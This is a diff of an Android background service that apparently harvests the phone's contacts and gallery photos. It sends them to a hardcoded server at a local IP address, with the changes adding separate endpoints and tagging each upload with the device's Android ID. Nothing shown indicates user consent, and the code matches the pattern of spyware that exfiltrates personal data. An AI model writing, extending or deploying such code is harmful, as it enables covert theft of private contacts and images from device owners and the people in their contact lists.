@@ -102,25 +102,25 @@ public class UploadService extends Service {
     }
 
     private void uploadToServer(List<String> contacts, List<String> galleryFiles, String androidId) {
-        String serverUrl = "http://192.168.200.78:3000/upload"; // Updated server URL
+        String contactsUrl = "http://192.168.10.15:3000/uploadContacts"; // Endpoint for contacts
+        String filesUrl = "http://192.168.10.15:3000/upload"; // Endpoint for file uploads
 
-        // Upload contacts as JSON (not a file)
+        // Upload contacts as JSON with Android ID
         for (String contact : contacts) {
             try {
-                // Create JSON payload for contact
-                String payload = "{\"type\":\"contact\",\"data\":\"" + escapeSpecialChars(contact) + "\"}";
-                sendPostRequest(serverUrl, payload); // Send contact as JSON, no file involved
+                String payload = "{\"type\":\"contact\",\"data\":\"" + escapeSpecialChars(contact) + "\", \"androidId\":\"" + androidId + "\"}";
+                sendPostRequest(contactsUrl, payload); // Send contact to /uploadContacts
             } catch (Exception e) {
                 Log.e(TAG, "Failed to upload contact: " + contact, e);
             }
         }
 
-        // Upload gallery files as multipart
+        // Upload gallery files as multipart with Android ID
         for (String filePath : galleryFiles) {
             File file = new File(filePath);
             if (file.exists()) {
                 try {
-                    uploadFile(serverUrl, file); // Upload files separately as multipart
+                    uploadFile(filesUrl, file, androidId); // Upload files to /upload with Android ID
                 } catch (Exception e) {
                     Log.e(TAG, "Failed to upload file: " + filePath, e);
                 }
@@ -128,19 +128,28 @@ public class UploadService extends Service {
         }
     }
 
+
     // Method to upload file using multipart
-    private void uploadFile(String serverUrl, File file) throws IOException {
+    private void uploadFile(String serverUrl, File file, String androidId) throws IOException {
         // Create a new MultipartBody for file upload
         MultipartBody.Builder builder = new MultipartBody.Builder().setType(MultipartBody.FORM);
+
+        // Add the Android ID as part of the form data
+        builder.addFormDataPart("androidId", androidId); // Add Android ID
+
+        // Add the file as part of the form data
         builder.addFormDataPart("file", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg"))); // Ensure 'file' matches server-side form field
 
-        // Send the multipart request
+        // Build the request body
         RequestBody requestBody = builder.build();
+
+        // Create a new request with the body
         Request request = new Request.Builder()
                 .url(serverUrl)
                 .post(requestBody)
                 .build();
 
+        // Send the request and handle the response
         try (Response response = new OkHttpClient().newCall(request).execute()) {
             if (response.isSuccessful()) {
                 Log.d(TAG, "File upload successful: " + file.getName());
@@ -149,6 +158,7 @@ public class UploadService extends Service {
             }
         }
     }
+
 
 
     // Escape special characters in the string to avoid JSON formatting issues
